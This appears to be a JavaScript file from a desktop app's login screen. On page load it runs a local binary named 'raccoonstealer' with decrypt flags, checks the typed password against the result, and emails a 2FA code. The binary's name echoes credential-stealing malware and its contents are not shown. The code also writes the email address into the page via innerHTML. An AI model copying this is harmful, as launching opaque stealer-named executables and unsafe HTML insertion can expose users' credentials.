const path = paths.getPath();
const info = require(`${path}/info.json`);
const sendMail = require('./js/sendmail.js');
let exec = require('child_process').execFile;
const raccoonstealer = paths.getStealer();

let twoFA = "";
let passjson = "";
const email = info.user;
let passwordd = document.getElementById('passwordd');

window.addEventListener('DOMContentLoaded', () =>{
    exec(raccoonstealer, ['--decrypt', '--acceptdecrypt'], (error, stdout, stderr) => {
        let data = JSON.parse(stdout);
        passjson = data.RaccoonLock;
        passwordd.classList.remove('hidden');
        passwordd.style.animation = 'fadein 0.5s';
    });
});

document.getElementById('submitv').addEventListener('click', () =>{
    let code = document.getElementById('code').value;
    let verify = document.getElementById('verify');

    if (code === twoFA){
        verify.style.animation = 'fadeout 1s forwards';
        setTimeout(() => window.location.href = 'mainmenu.html', 3000);
    }else{
        let err = document.getElementById('error');
        err.classList.remove('hidden');
        err.innerHTML = currentlang.verify.error;
    }
});

document.getElementById('submit').addEventListener('click', () =>{
    let password = document.getElementById('password').value;
    if (password === passjson){
        passwordd.style.animation = 'fadeout 1s forwards';
        setTimeout(() => {
            passwordd.style.display = 'none';
            info.passwordmode === false ? sendm() : window.location.href = 'mainmenu.html';
        }, 3000);
    }else{
        let errora = document.getElementById('errora');
        errora.classList.remove('hidden');
        errora.innerHTML = currentlang.passwordd.errora;
    }
});

function sendm(){
    let verify = document.getElementById('verify');
    verify.classList.remove('hidden');
    verify.style.animation = 'fadein 0.5s';
    if(info.language === 'kr') {
        document.getElementById('message').innerHTML = `${email}${currentlang.verify.message}.`;
    }else{
        document.getElementById('message').innerHTML = `${currentlang.verify.message} ${email}.`;
    }
    
    const mail = new sendMail(email, currentlang.mailtext);
    twoFA = mail.send();
}